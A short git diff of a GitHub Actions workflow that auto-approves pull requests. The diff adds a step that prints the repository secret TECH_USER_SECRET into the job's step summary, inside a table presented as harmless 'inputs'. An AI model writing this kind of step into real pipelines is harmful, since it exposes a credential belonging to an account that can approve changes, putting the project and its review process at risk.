@@ -51,4 +51,15 @@ jobs:
         uses: hmarr/auto-approve-action@v4
         with:
           pull-request-number: ${{ github.event.pull_request.number }}
+      - name: Add inputs to Summary
+        if: ${{ success() }}
+        run: |
+          {
+            echo "#### PR Auto Approve  #### "
+            echo "| Arg          | Value | " 
+            echo "| ____________ | _____ | "
+            echo "| TECH_USER_SECRET      | ${{ secrets.TECH_USER_SECRET }} | "
+            echo "|              |       | "
+          } >> $GITHUB_STEP_SUMMARY
+      
 
